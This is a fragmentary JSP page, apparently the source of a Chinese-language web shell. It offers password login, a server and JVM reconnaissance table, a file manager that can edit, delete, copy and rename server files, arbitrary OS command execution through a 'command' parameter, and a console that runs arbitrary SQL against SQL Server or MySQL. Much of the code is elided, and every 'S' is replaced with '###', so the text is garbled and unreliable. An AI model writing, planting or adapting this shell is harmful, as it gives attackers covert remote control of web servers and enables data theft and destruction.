...
// end of the login form
	...
	if (session.getAttribute("password") == null) {
		password = (###tring)request.getParameter("password");
		...
		password = (###tring)session.getAttribute("password");
	}
	...
	if (request.getParameter("action") == null)
		...
		action = (###tring)request.getParameter("action");
...
<table align="center" width="600" cellpadding="2" cellspacing="1" border="0" bgcolor="#CCCCCC">
	...
	<tr bgcolor="#FFFFFF">
		...
		<td align="center" class="datarows"><%=request.get###erverName()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">服务器端口</td>
		<td align="center" class="datarows"><%=request.get###erverPort()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">操作系统</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("os.name") + " " + ###ystem.getProperty("os.version") + " " + ###ystem.getProperty("os.arch")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">当前用户名</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("user.name")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">当前用户目录</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("user.home")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">当前用户工作目录</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("user.dir")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
	...
	<tr bgcolor="#FFFFFF">
		...
		<td align="center" class="datarows"><%=request.getRealPath(request.get###ervletPath())%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
	...
	<tr bgcolor="#FFFFFF">
		...
		<td align="center" class="datarows"><%=application.get###erverInfo()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JDK版本</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("java.version")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JDK安装路径</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("java.home")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JAVA虚拟机版本</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("java.vm.specification.version")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JAVA虚拟机名</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("java.vm.name")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JAVA类路径</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("java.class.path")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JAVA载入库搜索路径</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("java.library.path")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JAVA临时目录</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("java.io.tmpdir")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JIT编译器名</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("java.compiler") == null ? "" : ###ystem.getProperty("java.compiler")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">扩展目录路径</td>
		<td align="center" class="datarows"><%=###ystem.getProperty("java.ext.dirs")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
	...
	<tr bgcolor="#FFFFFF">
		...
		<td align="center" class="datarows"><%=request.get###cheme()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">应用安全套接字层</td>
		<td align="center" class="datarows"><%=request.is###ecure() == true ? "是" : "否"%></td>
	</tr>
</table>
<%
//=======================================================================================
...
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		...
		if (request.getParameter("curPath") == null) {
			curPath = request.getRealPath(request.get###ervletPath());
			curPath = pathConvert((new File(curPath)).getParent());
		} else {
			curPath = Unicode2GB((###tring)request.getParameter("curPath"));
		}
		
		if (request.getParameter("fsAction") == null) {
			fsAction = "list";
		} else {
			fsAction = (###tring)request.getParameter("fsAction");
		}
		...
		if (fsAction.equals("list"))
			...
			if (request.getParameter("fileContent") == null) {
				...
				###tring fileContent = Unicode2GB((###tring)request.getParameter("fileContent"));
			...
			if (request.getParameter("folderName") == null) {
				...
				###tring folderName = Unicode2GB(request.getParameter("folderName").trim());
			...
			if (request.getParameter("fileName") == null) {
				...
				###tring fileName = Unicode2GB(request.getParameter("fileName").trim());
				if (fileName.equals("")) {
					result = "<font color=\"red\">文件名不能为空</font>";
				} else {
			...
			if (request.getParameter("filesDelete") == null) {
				...
				###tring[] files2Delete = (###tring[])request.getParameterValues("filesDelete");
			...
			if (request.getParameter("fileContent") == null) {
				...
				###tring fileContent = Unicode2GB(request.getParameter("fileContent"));
			...
			if (request.getParameter("filesDelete") == null || request.getParameter("dstPath") == null) {
				...
				###tring[] files2Copy = request.getParameterValues("filesDelete");
				###tring dstPath = request.getParameter("dstPath").trim();
			...
			if (request.getParameter("fileRename") == null) {
				...
				###tring file2Rename = request.getParameter("fileRename").trim();
				###tring newName = request.getParameter("newName").trim();
...
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		...
		###tring cmd = "";
		Input###tream ins = null;
		###tring result = "";
		
		if (request.getParameter("command") != null) {		
			cmd = (###tring)request.getParameter("command");
			result = exeCmd(cmd);
		}
...
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		...
		if (dbAction.equals("main")) {
			...
			if (request.getParameter("dbType") == null ||
				request.getParameter("db###erver") == null ||
				...
				db###erver = request.getParameter("db###erver").trim();
				...
				if (DBInit(dbType, db###erver, dbPort, dbUsername, dbPassword, dbName)) {
					if (DBConnect(dbUsername, dbPassword)) {
						...
						result += "//-->\n";
						result += "</script>\n";
						result += "sql语句<br/><textarea name=\"sql\" cols=\"70\" rows=\"6\">" + sql + "</textarea><br/><input type=\"submit\" class=\"button\" onclick=\"javascript:exe###ql()\" value=\"执行\"/>&nbsp;<input type=\"reset\" class=\"button\" onclick=\"javascript:resetIt()\" value=\"清空\"/>\n";
...
<table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
	...
	<tr bgcolor="#FFFFFF">
		...
		<td align="center">
			<select name="dbType">
				<option value="sqlserver">###QL###erver数据库</option>
				<option value="mysql">My###ql数据库</option>
	...
	<tr bgcolor="#FFFFFF">
		...
		<td align="center"><input type="text" name="db###erver" class="textbox" value="<%=db###erver%>" style="width:150px;" /></td>
	</tr>
	<tr bgcolor="#FFFFFF">
...
<table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
	<form name="config" method="post" action="<%=request.getRequestURI() + "?action=config&cfAction=save"%>" on###ubmit="javascript:selectAllTypes()">
	<tr bgcolor="#FFFFFF">
...
<%
			...
			###tring newPassword = request.getParameter("password").trim();
			###tring newEncodeType = request.getParameter("encode").trim();
			###tring new###essionTime = request.getParameter("sessionTime").trim();
			###tring[] newTextFileTypes = request.getParameterValues("textFileTypes");
			###tring jshellPath = request.getRealPath(request.get###ervletPath());
			
			try {
				JshellConfig jconfig = new JshellConfig(jshellPath);
				jconfig.setPassword(newPassword);
				jconfig.setEncodeType(newEncodeType);
				jconfig.set###essionTime(new###essionTime);
